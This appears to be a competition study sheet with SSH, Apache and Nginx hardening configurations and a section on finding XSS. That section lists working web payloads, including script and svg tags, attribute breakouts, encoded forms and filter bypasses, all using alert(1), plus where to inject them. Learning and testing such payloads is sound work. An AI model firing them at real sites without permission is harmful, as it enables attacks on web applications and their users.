Lock Root Login

3. SSH HARDENING (MOST COMMON IN COMPETITIONS)

File: /etc/ssh/sshd_config

Recommended Configuration 
PermitRootLogin no
Port 2222
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers secureadmin
PermitEmptyPasswords no
X11Forwarding no
MaxAuthTries 3
LoginGraceTime 30
Ciphers aes256-ctr,aes192-ctr
MACs hmac-sha2-512,hmac-sha2-256

# Auto Logout (600 seconds)
ClientAliveInterval 600
ClientAliveCountMax 0

# Logging & Banner
LogLevel VERBOSE
Banner /etc/issue.net
  • Edit /etc/ssh/sshd_config
  • Apply settings as above
  • Restart service with sudo systemctl restart ssh
  • Test with ssh -p 2222 secureadmin@server
Restart SSH 
sudo systemctl restart ssh

5. APACHE HARDENING

Files: /etc/apache2/apache2.conf, /etc/apache2/conf-enabled/security.conf

Security Settings 
ServerTokens Prod

  AllowOverride None
  Require all denied

# Security Headers

# Generate Self-Signed Certificate
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-keyout /etc/ssl/private/apache-selfsigned.key \
-out /etc/ssl/certs/apache-selfsigned.crt

# Enable SSL Module
sudo a2enmod ssl
sudo a2ensite default-ssl.conf
Disable Unused Modules & Restart 
a2dismod status autoindex proxy
sudo systemctl restart apache2
  • Open /etc/apache2/apache2.conf and security config
  • Apply headers and directory restrictions
  • Enable SSL site and restart Apache
  • Verify with curl -I https://localhost

6. NGINX HARDENING

File: /etc/nginx/nginx.conf

Security Configuration 
server_tokens off;
client_max_body_size 1M;
autoindex off;

# Security Headers
add_header X-Frame-Options DENY;
add_header X-Content-Type-Options nosniff;
add_header X-XSS-Protection "1; mode=block";

# SSL Hardening (Port 443)
server {
    listen 443 ssl;
    ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt;
    ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
}
Restart Nginx 
sudo systemctl restart nginx
  • Edit /etc/nginx/nginx.conf
  • Add headers and SSL server block
  • Restart Nginx and verify with curl -I https://localhost

4.2 Beginner: Detect Reflected/Stored XSS

Common Payloads

HTML/Script Context 
<script>alert(1)</script>

<svg onload=alert(1)>
Attribute/Event Context 
" autofocus onfocus=alert(1) x="

URL Parameters

?name=%22%20onmouseover%3Dalert(1)%20x%3D%22

Where To Look

  • Search boxes, comment forms, profile fields (stored XSS)
  • Any reflected parameter appearing in response, headers or script
  • 404 pages, error messages, redirects, preview widgets
4.3 Intermediate: Bypasses & Context-Aware Payloads

Bypass Techniques

Encoding 
<script>alert(1)</script>  →  %3Cscript%3Ealert(1)%3C%2Fscript%3E
<img src=x onerror=alert(1)>  →  &lt;img src=x onerror=alert(1)&gt;
Breaking Out 
foo" onclick=alert(1) x="bar
);alert(1);//
Filtered Tags 
<svg><script>alert(1)</script></svg>
<details open ontoggle=alert(1)><summary>x</summary></details>

Context Rules

  • HTML: inject tags or event handlers
  • Attribute: close quote, inject event, re-open
  • JS: end string/statement, inject code, comment remainder
  • Style: URL() with javascript: blocked on modern browsers
